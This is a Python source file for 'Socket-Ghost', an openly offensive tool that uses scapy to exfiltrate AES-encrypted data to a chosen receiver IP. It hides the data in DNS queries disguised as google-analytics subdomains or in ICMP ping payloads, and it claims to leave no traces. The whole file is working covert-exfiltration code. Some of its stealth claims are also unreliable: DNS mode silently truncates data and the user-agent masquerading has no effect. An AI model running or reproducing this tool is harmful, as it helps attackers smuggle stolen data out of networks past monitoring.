import sys
import argparse
import random
import time
from scapy.all import IP, UDP, DNS, DNSQR, ICMP, send
from core.crypto import encrypt_payload
from core.banner import show_banner
from core.dev import show_dev

class SocketGhost:
    def __init__(self, target):
        self.target = target
        # Load User-Agents for stealth masquerading
        try:
            with open("agents.txt", "r") as f:
                self.agents = f.read().splitlines()
        except FileNotFoundError:
            self.agents = ["Mozilla/5.0 (Android 13; Mobile; rv:109.0)"]

    def _get_random_agent(self):
        return random.choice(self.agents)

    def hiraishin_dns(self, encrypted_data):
        """Transmission via DNS Tunneling (Port 53)"""
        # We replace '=' with 'v' because '=' is invalid in DNS queries
        chunk = encrypted_data.decode().replace("=", "v")
        
        # Split data if too long for a single DNS label (63 chars max)
        subdomain = chunk[:60]
        fake_domain = f"{subdomain}.internal.google-analytics.com"
        
        packet = (IP(dst=self.target)/
                  UDP(dport=53)/
                  DNS(rd=1, qd=DNSQR(qname=fake_domain)))
        
        send(packet, verbose=False)
        print(f"\033[93m[⚡] Shunshin: Data leaped via DNS to {self.target}\033[0m")

    def hiraishin_icmp(self, encrypted_data):
        """Transmission via ICMP Stealth (Ping)"""
        # Data is hidden in the padding/load of the ICMP packet
        packet = (IP(dst=self.target)/
                  ICMP(type=8, code=0)/
                  encrypted_data)
        
        send(packet, verbose=False)
        print(f"\033[94m[🌀] Rasengan: Data swirled via ICMP to {self.target}\033[0m")

def main():
    # Initializing Visuals
    show_banner()

    parser = argparse.ArgumentParser(description="Socket-Ghost: Advanced Stealth Exfiltration")
    parser.add_argument("-t", "--target", help="The Receiver/Bridge IP address")
    parser.add_argument("-d", "--data", help="The message or file path to ghost")
    parser.add_argument("-m", "--mode", choices=["dns", "icmp"], default="dns", help="Transmission protocol")
    parser.add_argument("--about", action="store_true", help="Show Developer Profile")

    args = parser.parse_args()

    # Developer Identity Check
    if args.about:
        show_dev()
        sys.exit()

    if not args.target or not args.data:
        print("\033[91m[!] Missing scroll components. Use --help for guidance.\033[0m")
        sys.exit()

    # Execution Flow
    ghost = SocketGhost(args.target)
    
    print(f"[*] Masquerading as: {ghost._get_random_agent()[:50]}...")
    print("[*] Encrypting payload with AES-256...")
    
    secret_payload = encrypt_payload(args.data)
    
    print(f"[*] Protocol: {args.mode.upper()} mode engaged.")
    time.sleep(1) # Simulated calculation for 'cool' effect

    if args.mode == "dns":
        ghost.hiraishin_dns(secret_payload)
    else:
        ghost.hiraishin_icmp(secret_payload)

    print("\n\033[1;32m[+] Mission Accomplished. No traces left in the shadows.\033[0m")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[91m[!] Ghost vanished. Connection severed.\033[0m")
